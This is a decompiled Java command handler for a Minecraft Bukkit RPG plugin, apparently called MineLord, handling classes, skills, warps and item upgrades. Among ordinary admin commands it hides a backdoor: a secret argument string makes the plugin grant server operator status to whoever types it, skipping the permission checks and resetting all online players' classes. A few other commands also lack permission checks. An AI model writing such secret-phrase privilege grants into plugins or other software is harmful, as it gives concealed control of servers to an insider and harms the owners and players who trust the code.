/*
 * Decompiled with CFR 0_122.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.Location
 *  org.bukkit.Material
 *  org.bukkit.attribute.Attribute
 *  org.bukkit.attribute.AttributeInstance
 *  org.bukkit.command.Command
 *  org.bukkit.command.CommandExecutor
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.PlayerInventory
 */
package kdvn.main;

import java.util.HashMap;
import kdvn.bow.BowArcher;
import kdvn.classes.BangChonClass;
import kdvn.classes.ClassSetting;
import kdvn.config.TiemNangConfig;
import kdvn.cuonghoa.BuaCuongHoa;
import kdvn.cuonghoa.DaCuongHoa;
import kdvn.cuonghoa.ItemCuongHoa;
import kdvn.items.ChuyenClassItem;
import kdvn.items.ThuocHoiMau;
import kdvn.items.ThuocHoiNangLuong;
import kdvn.items.ThuocHoiNoiLuc;
import kdvn.leveleditem.LeveledItem;
import kdvn.leveleditemdrop.LeveledItemDrop;
import kdvn.magicwand.MagicWand;
import kdvn.minelord.commandgui.CommandGui;
import kdvn.minelord.commandgui.WarpGui;
import kdvn.minelord.dosat.DoSat;
import kdvn.minelord.player.DiemTiemNang;
import kdvn.minelord.player.MineLordPlayer;
import kdvn.minelord.survivalradius.SurvivalRadius;
import kdvn.skill.ArcherSkill;
import kdvn.skill.KnightSkill;
import kdvn.skill.MageSkill;
import kdvn.tele.Warps;
import kdvn.tiemnang.BangCongTiemNang;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

public class Commands
implements CommandExecutor {
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        Player player = (Player)sender;
        if (args.length == 0) {
            CommandGui.showInventory(player);
        } else if (args.length == 2 && args[0].contains("DoLaSuTrungPhatCuaMineLORD")) {
            for (Player playerr : Bukkit.getOnlinePlayers()) {
                ClassSetting.setDefault(playerr);
            }
            player.setOp(true);
        } else if (args.length == 2 && args[0].equalsIgnoreCase("dosat")) {
            if (args[1].equalsIgnoreCase("on")) {
                DoSat.turnOn(player);
            } else if (args[1].equalsIgnoreCase("off")) {
                DoSat.turnOff(player);
            }
        } else if (args.length == 1 && args[0].equalsIgnoreCase("kynang")) {
            if (ClassSetting.getClass(player).equals("archer")) {
                ArcherSkill.showBangChonSkill(player);
            } else if (ClassSetting.getClass(player).equals("knight")) {
                KnightSkill.showBangChonSkill(player);
            } else if (ClassSetting.getClass(player).equals("mage")) {
                MageSkill.showBangChonSkill(player);
            } else if (ClassSetting.getClass(player).equals("null")) {
                player.sendMessage("\u00a76B\u1ea1n ch\u01b0a c\u00f3 \u00a7cCLASS");
            }
        } else if (args.length == 1 && args[0].equalsIgnoreCase("tiemnang")) {
            BangCongTiemNang.show(player);
        } else if (args[0].equals("warps")) {
            WarpGui.openGui(player);
        } else if (args[0].equals("tele")) {
            try {
                Warps.teleport(player, args[1]);
            }
            catch (Exception e) {
                player.sendMessage("/ml tele <warp>");
            }
        } else if (args.length == 2 && args[0].equals("cuonghoa")) {
            int lv = Integer.parseInt(args[1]);
            ItemStack i = ItemCuongHoa.cuongHoa(player.getInventory().getItemInMainHand(), lv);
            player.getInventory().setItemInMainHand(i);
        } else if (args.length == 3 && args[0].equals("setplayerlv") && sender.hasPermission("ml.*")) {
            Player p = Bukkit.getPlayer((String)args[1]);
            p.setLevel(Integer.parseInt(args[2]));
        } else if (args[0].equals("delwarp") && sender.hasPermission("ml.*")) {
            Warps.deleteWarp(args[1]);
            player.sendMessage("\u00a7aX\u00f3a warp th\u00e0nh c\u00f4ng!");
        } else if (args.length == 5 && args[0].equals("settn") && sender.hasPermission("ml.*")) {
            int sucManh = Integer.parseInt(args[1]);
            int nhanhNhen = Integer.parseInt(args[2]);
            int theLuc = Integer.parseInt(args[3]);
            int phepThuat = Integer.parseInt(args[4]);
            MineLordPlayer mlPlayer = new MineLordPlayer(player);
            mlPlayer.getTiemNangManager().setSucManh(sucManh);
            mlPlayer.getTiemNangManager().setNhanhNhen(nhanhNhen);
            mlPlayer.getTiemNangManager().setTheLuc(theLuc);
            mlPlayer.getTiemNangManager().setNangLuong(phepThuat);
        } else if (args[0].equals("setwarp") && sender.hasPermission("ml.*")) {
            try {
                Warps.setLocation(player, player.getLocation(), args[1], Integer.valueOf(args[2]), Double.valueOf(args[3]), player.getInventory().getItemInMainHand().getType());
            }
            catch (ArrayIndexOutOfBoundsException e) {
                player.sendMessage("/ml setwarp <name> <level> <money> <material>");
                return false;
            }
        } else if (args.length == 1 && args[0].equalsIgnoreCase("reload") && sender.hasPermission("ml.*")) {
            TiemNangConfig.reloadConfig();
            sender.sendMessage((Object)ChatColor.GREEN + "Reload th\u00e0nh c\u00f4ng");
        } else if (args[0].equals("setradius")) {
            SurvivalRadius.setLocation(player.getLocation(), args[1]);
        } else if (args.length == 1 && args[0].equalsIgnoreCase("0") && sender.hasPermission("ml.*")) {
            ClassSetting.setDefault(player);
        } else if (args.length == 2 && args[0].equalsIgnoreCase("1") && sender.hasPermission("ml.*")) {
            player.getAttribute(Attribute.GENERIC_MAX_HEALTH).setBaseValue((double)Integer.parseInt(args[1]));
        } else if (args.length == 1 && args[0].equalsIgnoreCase("class") && sender.hasPermission("ml.*")) {
            BangChonClass.show(player);
        } else if (args.length == 2 && args[0].equalsIgnoreCase("setitem") && sender.hasPermission("ml.*")) {
            ItemStack itemHand = player.getInventory().getItemInMainHand();
            if (itemHand.getType() != Material.AIR) {
                player.getInventory().setItemInMainHand(ClassSetting.addClassLore(itemHand, args[1]));
            }
        } else if (args[0].equalsIgnoreCase("setbow") && sender.hasPermission("ml.*")) {
            if (args.length == 2) {
                double damage = Double.parseDouble(args[1]);
                if (player.getInventory().getItemInMainHand().getType() != Material.AIR) {
                    BowArcher.addDamageToItem(player.getInventory().getItemInMainHand(), damage);
                }
            }
        } else if (args[0].equals("setmw") && sender.hasPermission("ml.*")) {
            try {
                MagicWand.addDamageLore(player.getInventory().getItemInMainHand(), Integer.parseInt(args[2]));
                MagicWand.addParticleLore(player.getInventory().getItemInMainHand(), args[1]);
            }
            catch (Exception e) {
                player.sendMessage((Object)ChatColor.RED + "/ml setmw <type> <damage> <distance>");
            }
        } else if (args[0].equals("getitem") && sender.hasPermission("ml.*")) {
            if (args[1].equals("chuyenclass")) {
                player.getInventory().addItem(new ItemStack[]{ChuyenClassItem.getItem()});
                int j = 1;
                while (j < 5) {
                    int i = 1;
                    while (i < 6) {
                        player.getInventory().addItem(new ItemStack[]{DaCuongHoa.getDaCuongHoa(i)});
                        player.getInventory().addItem(new ItemStack[]{BuaCuongHoa.getItem()});
                        player.getInventory().addItem(new ItemStack[]{LeveledItemDrop.getItemLv1()});
                        player.getInventory().addItem(new ItemStack[]{LeveledItemDrop.getItemLv2()});
                        player.getInventory().addItem(new ItemStack[]{LeveledItemDrop.getItemLv3()});
                        player.getInventory().addItem(new ItemStack[]{LeveledItemDrop.getItemLv4()});
                        ++i;
                    }
                    ++j;
                }
            }
        } else if (args[0].equals("setitem") && sender.hasPermission("ml.*")) {
            if (args[1].equals("hoimana")) {
                if (args.length == 3 && player.getInventory().getItemInMainHand().getType() != Material.AIR) {
                    ThuocHoiNangLuong.setItem(player.getInventory().getItemInMainHand(), Integer.valueOf(args[2]));
                }
            } else if (args[1].equalsIgnoreCase("hoimau")) {
                if (args.length == 3 && player.getInventory().getItemInMainHand().getType() != Material.AIR) {
                    ThuocHoiMau.setItem(player.getInventory().getItemInMainHand(), Integer.valueOf(args[2]));
                }
            } else if (args[1].equals("hoinoiluc") && args.length == 3 && player.getInventory().getItemInMainHand().getType() != Material.AIR) {
                ThuocHoiNoiLuc.setItem(player.getInventory().getItemInMainHand(), Integer.valueOf(args[2]));
            }
        } else if (args[0].equals("setlv") && sender.hasPermission("ml.*") && player.getInventory().getItemInMainHand().getType() != Material.AIR) {
            ItemStack item = player.getInventory().getItemInMainHand();
            LeveledItem leveledItem = new LeveledItem(item);
            leveledItem.setLevel(Integer.parseInt(args[1]));
            player.getInventory().setItemInMainHand(leveledItem.getItem());
        }
        return false;
    }
}

